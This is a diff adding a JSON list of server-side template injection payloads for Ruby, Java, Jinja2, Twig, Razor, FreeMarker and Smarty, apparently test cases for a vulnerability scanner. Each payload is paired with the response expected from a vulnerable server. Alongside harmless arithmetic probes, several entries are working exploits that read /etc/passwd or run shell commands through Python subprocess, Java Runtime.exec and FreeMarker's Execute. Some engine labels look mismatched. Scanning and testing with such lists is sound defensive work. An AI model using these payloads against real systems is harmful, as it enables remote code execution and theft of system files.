@@ -1,0 +1,86 @@
+[{
+		"name": "Ruby SSTI injection",
+		"payload": "<%= 7*7 %>",
+		"response": "49"
+	},
+	{
+		"name": "Ruby SSTI injection",
+		"payload": "#{ 7*7 }",
+		"response": "49"
+	},
+	{
+		"name": "Java SSTI injection",
+		"payload": "${7*7}",
+		"response": "49"
+	},
+	{
+		"name": "SSTI injection to LFI",
+		"payload": "<%= File.open('/etc/passwd').read %>",
+		"response": "root:"
+	},
+	{
+		"name": "SSTI injection to LFI",
+		"payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+		"response": "root:"
+	},
+	{
+		"name": "SSTI injection to LFI",
+		"payload": "{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+		"response": "root:"
+	},
+	{
+		"name": "SSTI injection to RCE",
+		"payload": "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
+		"response": "root:"
+	},
+	{
+		"name": "Java SSTI injection to RCE",
+		"payload": "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
+		"response": "root:"
+	},
+	{
+		"name": "SSTI injection to RCE",
+		"payload": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
+		"response": "root:"
+	},
+	{
+		"name": "Java SSTI injection",
+		"payload": "${{7*7}}",
+		"response": "49"
+	},
+	{
+		"name": "Twig SSTI injection",
+		"payload": "{{7*7}}",
+		"response": "49"
+	},
+	{
+		"name": "Jinja2 SSTI injection",
+		"payload": "[[7*7]]",
+		"response": "49"
+	},
+	{
+		"name": "ASP.NET Razor SSTI injection",
+		"payload": "@(45+4)",
+		"response": "49"
+	},
+	{
+		"name": "Java SSTI injection",
+		"payload": "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
+		"response": "root:"
+	},
+	{
+		"name": "Smarty SSTI injection",
+		"payload": "${'z'.join('ab')}",
+		"response": "zab"
+	},
+	{
+		"name": "Jinja2 SSTI injection",
+		"payload": "{{7*'7'}}",
+		"response": "7777777"
+	},
+	{
+		"name": "Twig SSTI injection",
+		"payload": "{{7*'7'}}",
+		"response": "49"
+	}
+]
